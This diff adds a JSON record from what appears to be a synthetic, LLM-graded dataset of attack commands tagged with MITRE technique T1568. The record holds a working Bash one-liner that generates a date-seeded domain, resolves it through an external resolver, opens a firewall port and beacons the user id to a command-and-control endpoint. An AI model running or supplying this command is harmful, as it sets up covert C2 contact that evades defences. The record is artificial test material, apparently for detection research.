@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1568",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "SEED=\"delta\"; LABEL=$(echo -n \"${SEED}$(date -u +%Y%m%d)\" | md5sum | cut -c1-12); FQDN=\"${LABEL}.cdn-metrics.org\"; PORT=2053; IP=$(host -t A \"$FQDN\" 1.1.1.1 | awk '/has address/ {print $4}' | shuf -n1); iptables -A OUTPUT -p tcp --dport ${PORT} -j ACCEPT; [ -n \"$IP\" ] && curl -sSf --connect-to \"${FQDN}:${PORT}:${IP}:${PORT}\" \"https://${FQDN}:${PORT}/register?u=$(id -u)\"",
+  "explanation": "Resolves a DGA domain using a specific external resolver to obtain a fast-flux IP, then directs curl to that IP with --connect-to while preserving the Host SNI.",
+  "rationale_steps": [
+    "Derive DGA domain from seed and date",
+    "Query external resolver for A records",
+    "Randomly select a returned IP",
+    "Establish C2 over port 2053 bound to that IP"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1568-a69367b6-a41625fd",
+  "source_prompt_hash": "a69367b6",
+  "timestamp_utc": "2025-09-30T09:31:37.018067Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper command separators, valid flags, and correct variable usage throughout the pipeline.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly implements T1568 (Dynamic Resolution) by generating a domain algorithmically using date and seed values, resolving it through an external DNS server, establishing firewall rules, and connecting to the dynamically resolved endpoint.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T04:59:24.993616Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with correct syntax, balanced quotes, valid flags, and proper command separators.",
+        "semantic_score": 4,
+        "semantic_justification": "The command accurately models DGA domain generation, fast-flux resolution, and `curl`'s SNI preservation, but the `iptables` command requires root privileges, rendering the full command sequence operationally infeasible under the stated 'Privilege: None', thus preventing the final connection.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T04:59:42.620007Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The one-liner is well-formed with balanced quotes, proper separators, and valid flags for host, iptables, and curl.",
+        "semantic_score": 4,
+        "semantic_justification": "It implements a date-seeded DGA, resolves via a specified DNS server, picks a flux-like IP, and uses curl --connect-to to preserve Host/SNI, though the iptables step would require root and may fail.",
+        "combined_score": 4.5,
+        "confidence": 0.86,
+        "timestamp": "2025-10-02T05:00:02.633979Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.333,
+    "llm_average_score": 4.667,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
